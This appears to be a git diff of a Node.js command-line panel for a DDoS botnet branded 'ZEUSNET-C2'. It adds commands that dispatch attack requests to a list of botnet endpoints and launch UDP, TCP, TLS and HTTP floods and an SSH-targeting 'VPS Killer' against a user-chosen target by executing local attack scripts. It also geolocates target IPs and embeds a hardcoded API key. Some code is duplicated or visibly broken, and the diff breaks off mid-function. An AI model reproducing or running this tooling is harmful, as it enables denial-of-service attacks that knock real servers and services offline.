+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}Attack Has Been Launched${Reset}
+========================================================================
+${bold}${cyan}Target Detail${Reset}
+${bold}${cyan} - Target${Reset}   : [ ${target} ]
+${bold}${cyan} - Isp${Reset}      : [ ${result.isp} ]
+${bold}${cyan} - Ip${Reset}       : [ ${result.query} ]
+${bold}${cyan} - As${Reset}      : [ ${result.as} ]
+${bold}${cyan}Attack Detail${Reset}
+${bold}${cyan} - STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan} - PORT :     [ 443 ]${Reset}
+${bold}${cyan} - Duration${Reset} : [ ${duration} ]
+${bold}${cyan} - Methods${Reset}  : [ ${methods} ]
 `);
         sigma();
     } catch (error) {
-        console.error('Error retrieving target information:', error.message);
+        console.error('Error Retrieving Target Information:', error.message);
     }
 
-    const [target, duration, methods] = args;
-let botnetData;
-let successCount = 0;
-const timeout = 20000;
-    
-    
-async function checkBotnetEndpoints() {
     let botnetData;
     let successCount = 0;
     const timeout = 20000;
     const validEndpoints = [];
 
-    // Load botnet data
+    // Load Botnet Data
     try {
         botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
     } catch (error) {
-        console.error('Error loading botnet data:', error.message);
+        console.error('Error Loading Botnet Data:', error.message);
         botnetData = { endpoints: [] };
     }
 
-    // Send requests to each endpoint
+    // Send Requests To Each Endpoint
     const requests = botnetData.endpoints.map(async (endpoint) => {
         const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
 
@@ -438,138 +399,134 @@ async function checkBotnetEndpoints() {
                 validEndpoints.push(endpoint);
             }
         } catch (error) {
-            console.error(`Error sending request to ${endpoint}: ${error.message}`);
+            console.error(`Error Sending Request To ${endpoint}: ${error.message}`);
         }
     });
 
     await Promise.all(requests);
 
-    // Save valid endpoints back to the file
+    // Save Valid Endpoints Back To The File
     botnetData.endpoints = validEndpoints;
     try {
         fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
     } catch (error) {
-        console.error('Error saving botnet data:', error.message);
+        console.error('Error Saving Botnet Data:', error.message);
         sigma();
     }
 }
 
 async function processBotnetEndpoint(args) {
     if (args.length < 1) {
-    console.log(`Example: addsrv <endpoints>
-addsrv http://1.1.1.1:2000/permen`);
+    console.log(`Example: Addsrv <Endpoints>
+Addsrv http://1.1.1.1:2000/zeusnet`);
     sigma();
 	return
   }
     try {
         const parsedUrl = new url.URL(args);
         const hostt = parsedUrl.host;
-        const endpoint = 'http://' + hostt + '/permen';
+        const endpoint = 'http://' + hostt + '/zeusnet';
 
-        // Load botnet data
+        // Load Botnet Data
         let botnetData;
         try {
             const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
             botnetData = JSON.parse(data);
         } catch (error) {
-            console.error('Error loading botnet data:', error.message);
+            console.error('Error Loading Botnet Data:', error.message);
             botnetData = { endpoints: [] };
         }
 
-        // Check if endpoint already exists
+        // Check If Endpoint Already Exists
         if (botnetData.endpoints.includes(endpoint)) {
-            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
+            return console.log(`Endpoint ${endpoint} Is Already In The Botnet List.`);
             sigma();
             return;           
         }
 
-        // Add endpoint and save data
+        // Add Endpoint And Save Data
         botnetData.endpoints.push(endpoint);
         try {
             await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
         } catch (error) {
-            console.error('Error saving botnet data:', error.message);
-            return console.log('Error saving botnet data.');
+            console.error('Error Saving Botnet Data:', error.message);
+            return console.log('Error Saving Botnet Data.');
         }
 
-        // Reply with success message
-        console.log(`Endpoint ${endpoint} added to botnet.`);
+        // Reply With Success Message
+        console.log(`Endpoint ${endpoint} Added To Botnet.`);
         sigma()
     } catch (error) {
-        console.error('Error processing botnet endpoint:', error.message);
-        console.log('An error occurred while processing the endpoint.');
+        console.error('Error Processing Botnet Endpoint:', error.message);
+        console.log('An Error Occurred While Processing The Endpoint.');
         sigma()
     }
 }
 
-async function getIPAddress(target) {
-    try {
-        const parsing = new url.URL(target);
-        const hostname = parsing.hostname;
-        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);
-
-        if (response.data && response.data.status === "success") {
-            return response.data.query;
-        } else {
-            return target;
-        }
-    } catch (error) {
-        console.error("Error fetching IP address:", error);
-        return target;
-    }
-}
-
-async function monitorOngoingAttacks() {
-    // Filter proses yang masih berjalan
-    processList = processList.filter((process) => {
-        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
-        return remaining > 0;
-    });
-
-    if (processList.length === 0) {
-        console.log("Tidak ada serangan yang sedang berlangsung.");
-        sigma();
-        return;
-    }
-
-    // Membuat tabel serangan
-    let attackDetails = "\n=== Ongoing Attacks ===\n";
-    attackDetails += `┌─────┬──────────────────────┬───────┬──────────┬─────────┐\n`;
-    attackDetails += `│  #  │        HOST          │ SINCE │ DURATION │ METHOD  │\n`;
-    attackDetails += `├─────┼──────────────────────┼───────┼──────────┼─────────┤\n`;
-
-    // Isi tabel dengan data proses
-    processList.forEach((process, index) => {
-        const host = process.ip || process.target;
-        const since = Math.floor((Date.now() - process.startTime) / 1000);
-        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik
-
-        // Baris data
-        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
-    });
-
-    // Garis bawah tabel
-    attackDetails += `└─────┴──────────────────────┴───────┴──────────┴─────────┘\n`;
-
-    console.log(attackDetails);
+// [========================================] //
+async function processBotnetEndpoint(args) {
+    if (args.length < 1) {
+    console.log(`Example: Addsrv <Endpoints>
+Addsrv http://1.1.1.1:2000/zeusnet`);
     sigma();
-}
+	return
+  }
+    try {
+        const parsedUrl = new url.URL(args);
+        const hostt = parsedUrl.host;
+        const endpoint = 'http://' + hostt + '/zeusnet';
 
+        // Load Botnet Data
+        let botnetData;
+        try {
+            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
+            botnetData = JSON.parse(data);
+        } catch (error) {
+            console.error('Error Loading Botnet Data:', error.message);
+            botnetData = { endpoints: [] };
+        }
+
+        // Check If Endpoint Already Exists
+        if (botnetData.endpoints.includes(endpoint)) {
+            return console.log(`Endpoint ${endpoint} Is Already In The Botnet List.`);
+            sigma();
+            return;           
+        }
+
+        // Add Endpoint And Save Data
+        botnetData.endpoints.push(endpoint);
+        try {
+            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
+        } catch (error) {
+            console.error('Error Saving Botnet Data:', error.message);
+            return console.log('Error Saving Botnet Data.');
+        }
+
+        // Reply With Success Message
+        console.log(`Endpoint ${endpoint} Added To Botnet.`);
+        sigma()
+    } catch (error) {
+        console.error('Error Processing Botnet Endpoint:', error.message);
+        console.log('An Error Occurred While Processing The Endpoint.');
+        sigma()
+    }
+}
+// [========================================] //
 async function checkBotnetEndpoints() {
     let botnetData;
     let successCount = 0;
     const timeout = 20000;
     const validEndpoints = [];
 
-    // Load botnet data
+    // Load Botnet Data
     try {
         botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
     } catch (error) {
-        console.error('Error loading botnet data:', error.message);
+        console.error('Error Loading Botnet Data:', error.message);
         botnetData = { endpoints: [] };
     }
 
-    // Send requests to each endpoint
+    // Send Requests To Each Endpoint
     const requests = botnetData.endpoints.map(async (endpoint) => {
         const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;
 
@@ -580,7 +537,7 @@ async function checkBotnetEndpoints() {
                 validEndpoints.push(endpoint);
             }
         } catch (error) {
-            console.error(`Error sending request to ${endpoint}: ${error.message}`);
+            console.error(`Error Sending Request To ${endpoint}: ${error.message}`);
         }
     });
 
@@ -589,131 +546,902 @@ async function checkBotnetEndpoints() {
     try {
         fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
     } catch (error) {
-        console.error('Error saving server data:', error.message);
+        console.error('Error Saving Server Data:', error.message);
         sigma()
     }
 
-    // Reply with the results
-    console.log(`Checked server. ${successCount} server online.`);
+    // Reply With The Results
+    console.log(`Checked Server. ${successCount} Server Is Online.`);
     sigma()
-    
-    
 }
 
+async function trackIP(args) {
+  if (args.length < 1) {
+    console.log(`Example: Track-Ip <Ip Address>
+Track-Ip 1.1.1.1`);
+    sigma();
+	return
+  }
+const [target] = args
+  if (target === '0.0.0.0') {
+  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
+	sigma()
+  } else {
+    try {
+const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
+const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
+const res = await fetch(`https://ipwho.is/${target}`);
+const additionalInfo = await res.json();
+const ipInfo = await response.json();
 
+    console.clear()
+    console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}Tracking IP Address Result${Reset} 
+Type ${bold}${biru_terang}"Cls"${Reset} To Clear Terminal
+========================================================================
+${bold}${cyan} - Flags${Reset}: ${ipInfo.country_flag}
+${bold}${cyan} - Country${Reset}: ${ipInfo.country_name}
+${bold}${cyan} - Capital${Reset}: ${ipInfo.country_capital}
+${bold}${cyan} - City${Reset}: ${ipInfo.city}
+${bold}${cyan} - ISP${Reset}: ${ipInfo.isp}
+${bold}${cyan} - Organization${Reset}: ${ipInfo.organization}
+${bold}${cyan} - Lat${Reset}: ${ipInfo.latitude}
+${bold}${cyan} - Long${Reset}: ${ipInfo.longitude}
+      
+${bold}${cyan} Google Maps${Reset}: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
+`)
+    sigma()
+  } catch (error) {
+      console.log(`Error Tracking ${target}`)
+      sigma()
+    }
+    }
+};
+// [========================================] //
+async function pod(args) {
+  if (args.length < 2) {
+    console.log(`Example: Kill-Ping <Target> <Duration>
+Kill-Ping 123.456.789.10 120`);
+    sigma();
+	return
+  }
+const [target, duration] = args
+try {
+const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
+const result = scrape.data;
+
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+========================================================================
+${bold}${cyan}TARGET DETAIL${Reset}
+ \x1b[1;31m  Attacks Details
+\x1b[1;31m      Status:     [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+\x1b[1;31m      HOST:       [\x1b[1m\x1b[95m ${target}  \x1b[1;31m]
+\x1b[1;31m      PORT:       [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+\x1b[1;31m      TIME:       [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+\x1b[1;31m      METHODS:    [\x1b[1m\x1b[95m Kill-Ping \x1b[1;31m]
+\x1b[1;31m  TARGET DETAILS
+\x1b[1;31m      ASN:        [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+\x1b[1;31m      ISP:        [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+\x1b[1;31m      IP:        [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+
+const metode = path.join(__dirname, `/lib/cache/ping.js`);
+exec(`node ${metode} ${target} 66507 6 1 ${duration}`)
+sigma()
+};
+// [========================================] //
+async function killDo(args) {
+  if (args.length < 2) {
+    console.log(`Example: Kill-Do <Target> <Duration>
+Kill-Do 123.456.78.910 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}VPS Killer Has Been Launched${Reset}
+========================================================================
+${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+${bold}${cyan}Methods  : Digital Ocean Killer${Reset}
+${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+const zeus_raw = path.join(__dirname, `/lib/cache/zeus-raw.js`);
+const zs_browser = path.join(__dirname, `/lib/cache/zs-browser.js`);
+const ssh = path.join(__dirname, `/lib/cache/kill-do.js`);
+exec(`node ${ssh} ${target} 22 root ${duration}`)
+exec(`node ${zs-browser} http://${target} ${duration}`)
+exec(`node ${zeus-raw} http://${target} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function udp(args) {
+  if (args.length < 3) {
+    console.log(`Example: Udp <Target> <Port> <Duration>
+Udp 123.456.78.910 53 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}UDP Flood Attack Launched${Reset}
+========================================================================
+${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+${bold}${cyan}Methods  : Udp Flood${Reset}
+${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+
+const metode = path.join(__dirname, `/lib/cache/udp.js`);
+exec(`node ${metode} ${target} ${port} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function tcp(args) {
+  if (args.length < 3) {
+    console.log(`Example: Tcp <Target> <Port> <Duration>
+Tcp 123.456.78.910 53 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}TCP Flood Attack Launched${Reset}
+========================================================================
+${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+${bold}${cyan}Methods  : Tcp Flood${Reset}
+${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+
+const metode = path.join(__dirname, `/lib/cache/tcp.js`);
+exec(`node ${metode} ${target} ${port} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function zeus_flood(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zeus-Flood <Target> <Port> <Duration>
+Zeus-Flood https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+	const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Flood \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zeus-flood.js`);
+exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
+sigma()
+};
+// [========================================] //
+async function zeus_tls(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zeus-Tls <Target> <Port> <Duration>
+Zeus-Tls https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Tls \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
